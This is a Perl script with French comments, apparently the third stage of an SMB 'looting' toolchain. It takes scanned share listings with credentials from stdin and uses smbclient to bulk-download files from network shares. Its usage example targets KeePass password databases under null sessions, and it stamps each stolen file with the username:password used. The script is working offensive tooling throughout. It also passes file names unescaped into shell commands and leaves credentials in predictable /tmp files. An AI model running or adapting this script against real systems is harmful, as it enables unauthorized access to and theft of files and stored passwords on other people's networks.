#!/usr/bin/perl

# Les resultats de smbloot2.pl peuvent être pipés dans smbloot3.pl afin de 
# télécharger les fichiers voulus.

# Usage (exemple en session nulle) : 
# ----------------------------------
# 1/ $ perl smbloot.pl -i scansSMB.gnmap -o partages.txt
# 2/ $ perl smbloot2.pl -p partages.txt -o listeRepertoiresFichiers
# 3/ $ grep -i '*.kdbx' listeRepertoiresFichiers/ALL_RESULTS.txt | ./smbloot3.pl -l LootageFichiers

# Options :
# ---------
# -l, --loot <repertoire>
#     Repertoire dans lequel sauvegarder les fichiers recuperes.
#     Si ce repertoire n'existe pas, il sera creer.
#
# -a, --all
#     Pour recuperer tous les fichiers listes.
#     Sans cette option, le nombre de fichiers telecharges est limite a 20 fichiers maxi.
#
# -n, --noedit
#     Pour garder le nom des fichiers sauvegardes sous leur forme originale.

use strict;
use warnings;
use Getopt::Long;
use IPC::Open3;
use Time::HiRes qw(usleep);
exit &main();

sub main() {

	print STDERR "smbloot\n\n";

	my ($inputRead, $inputLoot, $inputNoEdit, $inputHelp, $inputAll);
	$inputLoot = $inputNoEdit = $inputHelp = $inputAll = '';

	GetOptions('loot=s', \$inputLoot,
		'noedit', \$inputNoEdit,
		'all', \$inputAll,
		'help', \$inputHelp);
	unless (not -t STDIN) {
		print STDERR "ERREUR. fournir l'entree sous la forme suivante : grep -i '.doc' scansSMB-listShares/ALL_RESULTS.txt | ./smbloot3.pl -s fichiersRecuperes \n" and exit;
	}

	my $outputDir = '/tmp/share_read_'.int(rand(1000));
	$outputDir = $inputLoot if ($inputLoot ne '');
	my $tempAuthFile = '/tmp/share_read_auth_'.int(rand(1000)).'.txt';
	if (! -d $outputDir) {
		mkdir $outputDir;
	}
	chdir $outputDir;
	my @stdinLines = <STDIN>;
	if ($inputAll eq '' and scalar(@stdinLines) > 20) {
		print "Attention, vous allez telecharger ".scalar(@stdinLines)." fichiers. Si vous voulez vraiment le faire, utilisez l'option '-a' \n" and exit;
	}
	foreach my $line (@stdinLines) {
		chomp $line;
		my ($userpass, $share) = split('\\|:\\|', $line,2);
		my ($username, $password) = split(/:/, $userpass, 2);
		my ($empty, $empty1, $server, $sharename, $file) = split (/\\/, $share,5);
		open (AUTHFILE, '>'.$tempAuthFile) or die("Ne peux pas creer de fichier temporaire d'authentification $tempAuthFile: $!\n");
		print AUTHFILE "username = $username\n";
		print AUTHFILE "password = $password\n";
		close(AUTHFILE);
		my $short_filename = '...'.substr($file, -35);
		printf "%-45s",$short_filename;

# login et mot de passe
               my @lines = `smbclient -N -A $tempAuthFile '\\\\$server\\$sharename' -c 'get "$file" temp_out.txt' 2> /dev/null`;

# kerberos
#		my @lines = `smbclient -k -A $tempAuthFile '\\\\$server\\$sharename' -c 'get "$file" temp_out.txt' 2> /dev/null`;

		if (scalar(@lines) != 0) {
			if ($lines[0] =~ /NT_STATUS_FILE_IS_A_DIRECTORY/) {
				printf "%-45s\n", "Error: Directory";
				next;
			}
			elsif ($lines[0] =~ /NT_STATUS_SHARING_VIOLATION/) {
				printf "%-45s\n", "Error: Sharing violation";
				next;
			}
			elsif ($lines[0] =~ /NT_STATUS_ACCESS_DENIED/) {
				printf "%-45s\n", "Error: Access denied error";
				next;
			}
			elsif ($lines[0] =~ /NT_STATUS_OBJECT_NAME_NOT_FOUND/) {
				printf "%-45s\n","Error: Not found";
				next;
			}
		}
		else {
			printf "%-45s\n", "Success";
		}
		my $new_file_name = $file;
		$new_file_name =~ s/\\/_/g;
		$new_file_name = $server.'_'.$sharename.'_'.$new_file_name;
		`mv temp_out.txt '$new_file_name'`;
		if ($inputNoEdit eq '') {
			open(NEWFILE, ">>$new_file_name");
			print NEWFILE "\n# File from \\\\$server\\$sharename\\$file using $username:$password\n";

# login et mot de passe
			my @data_lines = `smbclient -N -A $tempAuthFile '\\\\$server\\$sharename' -c 'allinfo "$file"' 2> /dev/null`;

# Kerberos
#			my @data_lines = `smbclient -k -A $tempAuthFile '\\\\$server\\$sharename' -c 'allinfo "$file"' 2> /dev/null`;

			for my $data_line (@data_lines) {
				chomp $data_line;
				print NEWFILE "# $data_line\n"
			}
			print NEWFILE "# END\n";
			close(NEWFILE);
		}
		unlink($tempAuthFile);
		if ($inputLoot eq '') {
			open(FILE, "<$new_file_name");
			my @output = <FILE>;
			print "\n--------------------------------------\n";
			print "# File from \\\\$server\\$sharename\\$file using $username:$password\n";
			for my $out_line (@output) {
				print $out_line;
			}
			print "\n--------------------------------------\n";
			close(FILE);
		}
	}
	if ($inputLoot eq '') {
		if ($outputDir =~ /^\/tmp\/share_read_/) {
			`rm -rf '$outputDir'`;
		}
	}
	return 0;
}
